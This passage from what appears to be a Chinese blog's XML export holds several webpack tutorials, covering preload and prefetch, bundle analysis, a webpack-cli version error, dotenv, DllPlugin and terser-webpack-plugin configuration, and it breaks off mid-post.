<p>将 prefetch.html 的 link 标签的 prefetch 改为 <code>preload</code>，并增加资源类型 <code>as</code> 为 <code>script</code>，即得 preload.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;preload&quot; href&#x3D;&quot;script.js&quot; as&#x3D;&quot;script&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问本地服务器对应的 <code>prefetch.html</code>，或者直接访问线上<a href="https://chanvinxiao.com/demo/html/preload.html">页面</a>，初始状态下，查看控制台的网络选项卡下的内容如下</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4a5afe30da8888f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  <code>script.js</code> 被优先下载， size 列的解压字节不再为 0，即 <code>preload</code> 除了把脚本下载了下来，还进行了解析</li>
<li>  控制台目前仍为空，即脚本虽然被解析，但并没有运行</li>
</ul>
<p>点击 <code>Add Script</code>，网络选项卡并没有增加任何记录，但是控制台输出了脚本的打印内容</p>
<ul>
<li>  因为脚本已经解析完成，所以连从缓存获取都不需要了，直接运行即可</li>
<li>  如果没有在 3 秒内点击 <code>Add Script</code>，控制台会进行警告，因为没有及时使用应该优先加载的资源</li>
</ul>
<blockquote>
<p>The resource <a href="https://chanvinxiao.com/demo/html/script.js">https://chanvinxiao.com/demo/html/script.js</a> was preloaded using link preload but not used within a few seconds from the window’s load event. Please make sure it has an appropriate <code>as</code> value and it is preloaded intentionally.</p>
</blockquote>
<h2 id="webpack-的相关处理"><a href="#webpack-的相关处理" class="headerlink" title="webpack 的相关处理"></a>webpack 的相关处理</h2><p>运行以下命令安装相关依赖，并新建文件夹 src</p>
<blockquote>
<p>npm i -D webpack webpack-cli html-webpack-plugin <a href="mailto:&#112;&#x72;&#x65;&#108;&#x6f;&#x61;&#100;&#45;&#x77;&#x65;&#98;&#x70;&#97;&#x63;&#x6b;&#45;&#x70;&#108;&#117;&#103;&#105;&#110;&#x40;&#51;&#46;&#48;&#x2e;&#48;&#45;&#x62;&#101;&#116;&#97;&#x2e;&#52;">&#112;&#x72;&#x65;&#108;&#x6f;&#x61;&#100;&#45;&#x77;&#x65;&#98;&#x70;&#97;&#x63;&#x6b;&#45;&#x70;&#108;&#117;&#103;&#105;&#110;&#x40;&#51;&#46;&#48;&#x2e;&#48;&#45;&#x62;&#101;&#116;&#97;&#x2e;&#52;</a><br>mkdir src</p>
</blockquote>
<ul>
<li>  PreloadWebpackPlugin 的当前版本 2.x 与 webpack 当前版本 4.x 不兼容，所以需要指定版本号为最新的 3.x beta</li>
</ul>
<p>将 <code>main.js</code> 与 <code>script.js</code> 复制到 src 中，并将 <code>main.js</code> 的点击事件处理更新为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">button.addEventListener(&#39;click&#39;, e &#x3D;&gt; &#123;</span><br><span class="line">  import(&#x2F;* webpackChunkName: &quot;script&quot; *&#x2F; &#39;.&#x2F;script.js&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>  <a href="https://webpack.js.org/api/module-methods/#import-1">import()</a> 为动态加载脚本，webpack 会生成类似以上动态创建 <code>script</code> 标签的代码</li>
<li>  import 里的注释为特殊含义的魔法注释，如果不设置 webpackChunkName，加载的脚本将被按数字次序命名</li>
</ul>
<p>增加 <code>webpack.config.js</code> 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&#39;html-webpack-plugin&#39;);</span><br><span class="line">const PreloadWebpackPlugin &#x3D; require(&#39;preload-webpack-plugin&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  entry: &#39;.&#x2F;src&#x2F;main.js&#39;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      filename: &#39;preload.html&#39;</span><br><span class="line">    &#125;),</span><br><span class="line">    new PreloadWebpackPlugin()</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>  <a href="https://webpack.js.org/plugins/html-webpack-plugin/">HtmlWebpackPlugin</a> 将自动生成相应的 html 文件，默认为 index.html，这里通过设置 <code>filename</code> 选项更改</li>
<li>  <a href="https://github.com/GoogleChrome/preload-webpack-plugin">PreloadWebpackPlugin</a> 为 HtmlWebpackPlugin 的插件，默认为其动态加载资源增加链接类型为 <code>preload</code> 的 <code>link</code> 标签，其 <code>as</code> 的值可根据后缀自动判断</li>
</ul>
<p>PreloadWebpackPlugin 也支持 prefetch，需要增加 <code>rel</code> 选项为 <code>prefetch</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new HtmlWebpackPlugin(&#123;</span><br><span class="line">  filename: &#39;prefetch.html&#39;</span><br><span class="line">&#125;),</span><br><span class="line">new PreloadWebpackPlugin(&#123;</span><br><span class="line">  rel: &#39;prefetch&#39;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不过要同时生成 preload.html 和 prefetch.html，需要在对应的 PreloadWebpackPlugin 中设置 <code>excludeHtmlNames</code> 排除对方，否则会同时产生 preload 和 prefetch 的 link 标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new HtmlWebpackPlugin(&#123;</span><br><span class="line">  filename: &#39;preload.html&#39;</span><br><span class="line">&#125;),</span><br><span class="line">new HtmlWebpackPlugin(&#123;</span><br><span class="line">  filename: &#39;prefetch.html&#39;</span><br><span class="line">&#125;),</span><br><span class="line">new PreloadWebpackPlugin(&#123;</span><br><span class="line">  excludeHtmlNames: [&#39;prefetch.html&#39;]</span><br><span class="line">&#125;),</span><br><span class="line">new PreloadWebpackPlugin(&#123;</span><br><span class="line">  rel: &#39;prefetch&#39;,</span><br><span class="line">  excludeHtmlNames: [&#39;preload.html&#39;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构建文件（也可在 <code>package.json</code> 中增加 <code>build</code> 脚本）</p>
<blockquote>
<p>npx webpack</p>
</blockquote>
<p><code>dist</code> 文件夹中将生成 prefetch.html 和 preload.html，访问本地服务器对应地址，即可得到与以上静态页面同样的效果</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此文使用静态页面和 webpack 打包两种方式演示了预取和预加载的实现 <a href="https://github.com/vinzid/prefetch-preload-demo"></a>，主要技术点如下：</p>
<ul>
<li>  ELEMENT.appendChild 动态创建脚本</li>
<li>  import() 动态加载脚本并设置魔法注释</li>
<li>  html-webpack-plugin 及其插件的配置</li>
</ul>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack-bundle-analyzer可视化分析包大小</title>
    <url>/nirvana/webpack/webpack/webpack-bundle-analyzer%E5%8F%AF%E8%A7%86%E5%8C%96%E5%88%86%E6%9E%90%E5%8C%85%E5%A4%A7%E5%B0%8F/</url>
    <content><![CDATA[<p>前端开发现在由于使用node进行开发，会安装很多依赖，但是很多依赖的资源是不透明的，构建完成后，需要分析生产文件到底依赖那些资源，每个资源占据多少空间，这样才能有针对性的优化。所以需要有个方便分析包大小的工具，可以按需优化。<br>先看webpack-bundle-analyzer的效果图（官方效果图）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-0a46514a70cd94d0.gif?imageMogr2/auto-orient/strip"></p>
<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install webpack-bundle-analyzer –save-dev</span><br></pre></td></tr></table></figure>
<h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 分析包内容 </span><br><span class="line">const BundleAnalyzerPlugin &#x3D; require(&#39;webpack-bundle-analyzer&#39;).BundleAnalyzerPlugin; </span><br><span class="line">module.exports &#x3D; &#123; </span><br><span class="line">plugins: [ </span><br><span class="line">&#x2F;&#x2F; 开启 BundleAnalyzerPlugin </span><br><span class="line">new BundleAnalyzerPlugin(), </span><br><span class="line">    ], </span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure>
<p>该插件的默认配置，一般无需修改<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new BundleAnalyzerPlugin(&#123;</span><br><span class="line">  &#x2F;&#x2F;  可以是&#96;server&#96;，&#96;static&#96;或&#96;disabled&#96;。</span><br><span class="line">  &#x2F;&#x2F;  在&#96;server&#96;模式下，分析器将启动HTTP服务器来显示软件包报告。</span><br><span class="line">  &#x2F;&#x2F;  在“静态”模式下，会生成带有报告的单个HTML文件。</span><br><span class="line">  &#x2F;&#x2F;  在&#96;disabled&#96;模式下，你可以使用这个插件来将&#96;generateStatsFile&#96;设置为&#96;true&#96;来生成Webpack Stats JSON文件。</span><br><span class="line">  analyzerMode: &#39;server&#39;,</span><br><span class="line">  &#x2F;&#x2F;  将在“服务器”模式下使用的主机启动HTTP服务器。</span><br><span class="line">  analyzerHost: &#39;127.0.0.1&#39;,</span><br><span class="line">  &#x2F;&#x2F;  将在“服务器”模式下使用的端口启动HTTP服务器。</span><br><span class="line">  analyzerPort: 8888, </span><br><span class="line">  &#x2F;&#x2F;  路径捆绑，将在&#96;static&#96;模式下生成的报告文件。</span><br><span class="line">  &#x2F;&#x2F;  相对于捆绑输出目录。</span><br><span class="line">  reportFilename: &#39;report.html&#39;,</span><br><span class="line">  &#x2F;&#x2F;  模块大小默认显示在报告中。</span><br><span class="line">  &#x2F;&#x2F;  应该是&#96;stat&#96;，&#96;parsed&#96;或者&#96;gzip&#96;中的一个。</span><br><span class="line">  &#x2F;&#x2F;  有关更多信息，请参见“定义”一节。</span><br><span class="line">  defaultSizes: &#39;parsed&#39;,</span><br><span class="line">  &#x2F;&#x2F;  在默认浏览器中自动打开报告</span><br><span class="line">  openAnalyzer: true,</span><br><span class="line">  &#x2F;&#x2F;  如果为true，则Webpack Stats JSON文件将在bundle输出目录中生成</span><br><span class="line">  generateStatsFile: false, </span><br><span class="line">  &#x2F;&#x2F;  如果&#96;generateStatsFile&#96;为&#96;true&#96;，将会生成Webpack Stats JSON文件的名字。</span><br><span class="line">  &#x2F;&#x2F;  相对于捆绑输出目录。</span><br><span class="line">  statsFilename: &#39;stats.json&#39;,</span><br><span class="line">  &#x2F;&#x2F;  stats.toJson（）方法的选项。</span><br><span class="line">  &#x2F;&#x2F;  例如，您可以使用&#96;source：false&#96;选项排除统计文件中模块的来源。</span><br><span class="line">  &#x2F;&#x2F;  在这里查看更多选项：https：  &#x2F;&#x2F;github.com&#x2F;webpack&#x2F;webpack&#x2F;blob&#x2F;webpack-1&#x2F;lib&#x2F;Stats.js#L21</span><br><span class="line">  statsOptions: null,</span><br><span class="line">  logLevel: &#39;info&#39; &#x2F;&#x2F; 日志级别。可以是&#39;信息&#39;，&#39;警告&#39;，&#39;错误&#39;或&#39;沉默&#39;。</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h5 id="三、启动"><a href="#三、启动" class="headerlink" title="三、启动"></a>三、启动</h5><p>在package.json的scripts里加入下面这句话，就可以npm run build之后看到webpack-bundle-analyzer的效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;analyz&quot;: &quot;NODE_ENV&#x3D;production npm_config_report&#x3D;true npm run build&quot;</span><br></pre></td></tr></table></figure>
<p>浏览器打开127.0.0.1:8888地址可以看到效果图。</p>
<h5 id="四：模块功能："><a href="#四：模块功能：" class="headerlink" title="四：模块功能："></a>四：模块功能：</h5><ul>
<li>意识到你的文件打包压缩后中真正的内容</li>
<li>找出哪些模块组成最大的大小</li>
<li>找到错误的模块</li>
<li>最好的事情是它支持缩小捆绑！它解析它们以获得实际大小的捆绑模块。它也显示他们的gzipped大小！</li>
</ul>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>关于 webpack-cli4.0 及以上版本 和 webpack-dev-server 之间的依赖报connot find module “webpack-cli/bin/config-yargs”</title>
    <url>/nirvana/webpack/webpack/webpack4error/</url>
    <content><![CDATA[<p>今天在执行webpack-dev-server命令时，一直报Error: Cannot find module ‘webpack-cli/bin/config-yargs’<br>在执行npm run dev命令时报：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">connot find module “webpack-cli&#x2F;bin&#x2F;config-yargs”</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-6c0ce76392782d11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>可以通过对webpack-cli进行降级处理，成功解决问题。<br>步骤：<br>一：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall webpack-cli   &#x2F;&#x2F;这是进行局部删除webpack-cli脚手架</span><br></pre></td></tr></table></figure>
<p>二;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install webpack-cli@3.3.11    &#x2F;&#x2F;@后面的数字指定不同的版本，版本应该低于4.0</span><br></pre></td></tr></table></figure>
<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-8e6a60a3309046c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在 webpack 官网上可以看到依赖的下载与设置方法没有改变，启动命令发生了改变。<br>直接 webpack serve –open，就可以了。</p>
<p>依赖关系</p>
<table>
<thead>
<tr>
<th>依赖</th>
<th>版本</th>
<th>新版本</th>
</tr>
</thead>
<tbody><tr>
<td>webpack</td>
<td>4</td>
<td>5</td>
</tr>
<tr>
<td>webpack-cli</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>webpack-dev-server</td>
<td>3</td>
<td>3</td>
</tr>
</tbody></table>
<p>之前的依赖关系是 webpack-dev-server 依赖于 webpack-cli 内部的 config-yargs，cli 升级到 4.0 以后，统一了 webpack 命令的入口文件，反过来依赖 webpack-dev-server 来实现 webpack serve –open 的命令。</p>
<p>原文链接：<a href="https://blog.csdn.net/weixin_40599109/article/details/109582365">https://blog.csdn.net/weixin_40599109/article/details/109582365</a></p>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack getaddrinfo ENOTFOUND localhost错误</title>
    <url>/nirvana/webpack/webpack/webpack-getaddrinfo-ENOTFOUND-localhost-%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>原因 没有指定 localhost<br>在host 文件中添加<br>127.0.0.1 localhost</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">events.js:141</span><br><span class="line">      throw er; &#x2F;&#x2F; Unhandled &#39;error&#39; event</span><br><span class="line">      ^</span><br><span class="line"></span><br><span class="line">Error: getaddrinfo ENOTFOUND localhost</span><br><span class="line">    at errnoException (dns.js:27:10)</span><br><span class="line">    at GetAddrInfoReqWrap.onlookup [as oncomplete] (dns.js:78:26)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>dotenv，从文件加载环境变量</title>
    <url>/nirvana/webpack/webpack/webpackdotenv/</url>
    <content><![CDATA[<p>Node.js程序运行时加载不同的配置，比如开发环境和生产环境的数据数据库配置就可能不一样，使用 process.env.DB_HOST 环境变量，可以在Node.js程序内部方便获取参数信息。</p>
<p>但是，程序启动时，怎样将环境变量传递给程序，这可能会是一个相对麻烦的事情，因为这关系到操作系统层的配置问题。</p>
<h2 id="dotenv"><a href="#dotenv" class="headerlink" title="dotenv"></a>dotenv</h2><p>dotenv是一个可以使得Node.js从文件中加载环境变量的库，使用dotenv，我们只需要将程序的环境变量配置写在.env文件中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .env file</span><br><span class="line">DB_HOST&#x3D;localhost</span><br><span class="line">DB_USER&#x3D;root</span><br><span class="line">DB_PASS&#x3D;s1mpl3</span><br></pre></td></tr></table></figure>
<p>然后，在Node.js程序启动时运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&#39;dotenv&#39;).config()</span><br></pre></td></tr></table></figure>
<p>接着，我们就可以在接下来的程序中方便地使用环境变量了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const db &#x3D; require(&#39;db&#39;)</span><br><span class="line">db.connect(&#123;</span><br><span class="line">  host: process.env.DB_HOST,</span><br><span class="line">  username: process.env.DB_USER,</span><br><span class="line">  password: process.env.DB_PASS</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack使用-详解DllPlugin</title>
    <url>/nirvana/webpack/webpack/webpack%E4%BD%BF%E7%94%A8-%E8%AF%A6%E8%A7%A3DllPlugin/</url>
    <content><![CDATA[<h3 id="什么是DLL"><a href="#什么是DLL" class="headerlink" title="什么是DLL"></a>什么是DLL</h3><blockquote>
<p>DLL(Dynamic Link Library)文件为动态链接库文件,在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。</p>
</blockquote>
<p>举个例子：很多产品都用到螺丝，但是工厂在生产不同产品时，不需要每次连带着把螺丝也生产出来，因为螺丝可以单独生产，并给多种产品使用。在这里螺丝的作用就可以理解为是dll。</p>
<h3 id="为什么要使用Dll"><a href="#为什么要使用Dll" class="headerlink" title="为什么要使用Dll"></a>为什么要使用Dll</h3><p>通常来说，我们的代码都可以至少简单区分成<strong>业务代码</strong>和<strong>第三方库</strong>。如果不做处理，每次构建时都需要把所有的代码重新构建一次，耗费大量的时间。然后大部分情况下，很多第三方库的代码并不会发生变更（除非是版本升级），这时就可以用到dll：<strong>把复用性较高的第三方模块打包到动态链接库中，在不升级这些库的情况下，动态库不需要重新打包，每次构建只重新打包业务代码</strong>。</p>
<p>还是上面的例子：把每次构建，当做是生产产品的过程，我们把生产螺丝的过程先提取出来，之后我们不管调整产品的功能或者设计（对应于业务代码变更），<strong>都不必重复生产螺丝（第三方模块不需要重复打包）</strong>；除非是<strong>产品要使用新型号的螺丝（第三方模块需要升级）</strong>，才需要去重新生产新的螺丝，然后接下来又可以专注于调整产品本身。</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>使用dll时，可以把构建过程分成dll构建过程和主构建过程（实质也就是如此），所以需要两个构建配置文件，例如叫做<code>webpack.config.js</code>和<code>webpack.dll.config.js</code>。</p>
<h3 id="1-使用DLLPlugin打包需要分离到动态库的模块"><a href="#1-使用DLLPlugin打包需要分离到动态库的模块" class="headerlink" title="1. 使用DLLPlugin打包需要分离到动态库的模块"></a>1. 使用<code>DLLPlugin</code>打包需要分离到动态库的模块</h3><p><code>DllPlugin</code>是<code>webpack</code>内置的插件，不需要额外安装，直接配置<code>webpack.dll.config.js</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;&#x3D;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    &#x2F;&#x2F; 第三方库</span><br><span class="line">    react: [&#39;react&#39;, &#39;react-dom&#39;, &#39;react-redux&#39;]</span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    &#x2F;&#x2F; 输出的动态链接库的文件名称，[name] 代表当前动态链接库的名称，</span><br><span class="line">    filename: &#39;[name].dll.js&#39;,</span><br><span class="line">    path: resolve(&#39;dist&#x2F;dll&#39;),</span><br><span class="line">    &#x2F;&#x2F; library必须和后面dllplugin中的name一致 后面会说明</span><br><span class="line">    library: &#39;[name]_dll_[hash]&#39;</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">  &#x2F;&#x2F; 接入 DllPlugin</span><br><span class="line">    new webpack.DllPlugin(&#123;</span><br><span class="line">      &#x2F;&#x2F; 动态链接库的全局变量名称，需要和 output.library 中保持一致</span><br><span class="line">      &#x2F;&#x2F; 该字段的值也就是输出的 manifest.json 文件 中 name 字段的值</span><br><span class="line">      name: &#39;[name]_dll_[hash]&#39;,</span><br><span class="line">      &#x2F;&#x2F; 描述动态链接库的 manifest.json 文件输出时的文件名称</span><br><span class="line">      path: path.join(__dirname, &#39;dist&#x2F;dll&#39;, &#39;[name].manifest.json&#39;)</span><br><span class="line">    &#125;),</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先来看看，这一步到底做了什么。执行：<code>webpack --config webpack.dll.config</code>，然后到指定的输出文件夹查看输出：</p>
<ol>
<li> <code>react.dll</code>文件里是使用数组保存的模块，索引值就作为id；</li>
<li> <code>react.manifest.json</code>文件里，是用来描述对应的dll文件里保存的模块</li>
</ol>
<p>里暴露出刚刚构建的所有模块，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;:&quot;react_dll_553e24e2c44987d2578f&quot;,</span><br><span class="line">  &quot;content&quot;:&#123;</span><br><span class="line">    &quot;.&#x2F;node_modules&#x2F;webpack&#x2F;node_modules&#x2F;process&#x2F;browser.js&quot;:&#123;&quot;id&quot;:0,&quot;meta&quot;:&#123;&#125;&#125;,&quot;.&#x2F;node_modules&#x2F;react&#x2F;node_modules&#x2F;fbjs&#x2F;lib&#x2F;invariant.js&quot;:&#123;&quot;id&quot;:1,&quot;meta&quot;:&#123;&#125;&#125;,&quot;.&#x2F;node_modules&#x2F;react&#x2F;lib&#x2F;Object.assign.js&quot;:&#123;&quot;id&quot;:2,&quot;meta&quot;:&#123;&#125;&#125;,&quot;.&#x2F;node_modules&#x2F;react&#x2F;node_modules&#x2F;fbjs&#x2F;lib&#x2F;warning.js&quot;:&#123;&quot;id&quot;:3,&quot;meta&quot;:&#123;&#125;&#125;</span><br><span class="line">    &#x2F;&#x2F;省略相似代码</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-在主构建配置文件使用动态库文件"><a href="#2-在主构建配置文件使用动态库文件" class="headerlink" title="2. 在主构建配置文件使用动态库文件"></a>2. 在主构建配置文件使用动态库文件</h3><p>在<code>webpack.config</code>中使用dll要用到<code>DllReferencePlugin</code>,这个插件通过引用 dll 的 manifest 文件来把依赖的名称映射到模块的 id 上，之后再在需要的时候通过内置的 <strong>webpack_require</strong> 函数来 require 他们.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new webpack.DllReferencePlugin(&#123;</span><br><span class="line">  context: __dirname,</span><br><span class="line">  manifest: require(&#39;.&#x2F;dist&#x2F;dll&#x2F;react.manifest.json&#39;)</span><br><span class="line">&#125;),</span><br></pre></td></tr></table></figure>

<p>第一步产出的<code>manifest</code>文件就用在这里，给主构建流程作为查找dll的依据：<strong>DllReferencePlugin去 manifest.json 文件读取 name 字段的值，把值的内容作为在从全局变量中获取动态链接库中内容时的全局变量名</strong>，因此：在 webpack_dll.config.js 文件中，DllPlugin 中的 name 参数必须和 output.library 中保持一致。</p>
<h3 id="3-在入口文件引入dll文件。"><a href="#3-在入口文件引入dll文件。" class="headerlink" title="3. 在入口文件引入dll文件。"></a>3. 在入口文件引入dll文件。</h3><p>生成的dll暴露出的是全局函数，因此还需要在入口文件里面引入对应的dll文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;!--引用dll文件--&gt;</span><br><span class="line">  &lt;script src&#x3D;&quot;..&#x2F;..&#x2F;dist&#x2F;dll&#x2F;react.dll.js&quot; &gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>首先从前面的介绍，至少可以看出dll的两个作用</p>
<ol>
<li><p>分离代码，业务代码和第三方模块可以被打包到不同的文件里，这个有几个好处：</p>
<ul>
<li>  避免打包出单个文件的大小太大，不利于调试</li>
<li>  将单个大文件拆成多个小文件之后，一定情况下有利于加载（不超出浏览器一次性请求的文件数情况下，并行下载肯定比串行快）</li>
</ul>
</li>
<li><p> 提升构建速度。第三方库没有变更时，由于我们只构建业务相关代码，相比全部重新构建自然要快的多。</p>
</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>从前面可以看到dll带来的优点，但<strong>并不意味着我们就应该把除业务代码外的所有代码全部都丢到dll中</strong>，举一个例子：<br>1.对于<code>lodash</code>这种第三方库，正确的用法是只去<code>import</code>所需的函数（用什么引什么），例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 正确用法</span><br><span class="line">import isPlainObject from &#39;lodash&#x2F;isPlainObject&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;错误用法</span><br><span class="line">import &#123; isPlainObject &#125; from &#39;lodash&#39;</span><br></pre></td></tr></table></figure>

<p>这两种写法的差别在于，打包时webpack会根据引用去打包依赖的内容，所以第一种写法，webpack只会打包lodash的isPlainObject库，第二种写法却会打包整个<code>lodash</code>。现在假设在项目中只是用到不同模块对lodash里的某几个函数并且没有对于某个函数重复使用非常多次，那么这时候把<code>lodash</code>添加到dll中，带来的收益就并不明显，反而导致2个问题：</p>
<ol>
<li> 由于打包了整个<code>lodash</code>，而导致打包后的文件<strong>总大小</strong>（注意是总大小）比原先还要大</li>
<li> 在dll打包太多内容也需要耗费时间，虽然我们一般只在第三方模块更新之后才进行重新预编译（就是dll打包的过程），但是如果这个时间太长的话体验也不好、</li>
</ol>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack配置terser-webpack-plugin 去掉项目中多余的debugger</title>
    <url>/nirvana/webpack/webpack/webpack%E9%85%8D%E7%BD%AEterser-webpack-plugin%20%E5%8E%BB%E6%8E%89%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%A4%9A%E4%BD%99%E7%9A%84debugger/</url>
    <content><![CDATA[<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>如果你使用的是 webpack v5 或以上版本，你不需要安装这个插件。webpack v5 自带最新的 <code>terser-webpack-plugin</code>。如果使用 webpack v4，则必须安装 <code>terser-webpack-plugin</code> v4 的版本。</p>
<p>首先，你需要安装 <code>terser-webpack-plugin</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install terser-webpack-plugin --save-dev</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后将插件添加到你的 <code>webpack</code> 配置文件中，直接在<code>optimization中</code>配置。例如：</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const TerserPlugin &#x3D; require(&#39;terser-webpack-plugin&#39;);</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  	optimization: &#123;</span><br><span class="line">	    minimize: true,</span><br><span class="line">	    minimizer: [new TerserPlugin(&#123;</span><br><span class="line">	    	test: &#x2F;\.js(\?.*)?$&#x2F;i,    &#x2F;&#x2F;匹配参与压缩的文件</span><br><span class="line">	    	parallel: true,    &#x2F;&#x2F;使用多进程并发运行</span><br><span class="line">	    	terserOptions: &#123;    &#x2F;&#x2F;Terser 压缩配置</span><br><span class="line">	    		output:&#123;comments: false&#125;</span><br><span class="line">	    	&#125;,</span><br><span class="line">	    	extractComments: true,    &#x2F;&#x2F;将注释剥离到单独的文件中</span><br><span class="line">                compress: &#123;&#x2F;&#x2F;console删除</span><br><span class="line">                    pure_funcs: [&quot;console.log&quot;]</span><br><span class="line">                &#125;</span><br><span class="line">	    &#125;)],</span><br><span class="line">  	&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项 "></a>选项 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#options"></a></h2><h3 id="test"><a href="#test" class="headerlink" title="test "></a><code>test</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#test"></a></h3><p>类型： <code>String|RegExp|Array&lt;String|RegExp&gt;</code> 默认值：<code>/\.m?js(\?.*)?$/i</code></p>
<p>用来匹配需要压缩的文件。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        test: &#x2F;\.js(\?.*)?$&#x2F;i,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="include"><a href="#include" class="headerlink" title="include "></a><code>include</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#include"></a></h3><p>类型： <code>String|RegExp|Array&lt;String|RegExp&gt;</code> 默认值： <code>undefined</code></p>
<p>匹配参与压缩的文件。</p>
<p><strong>webpack.config.js</strong></p>
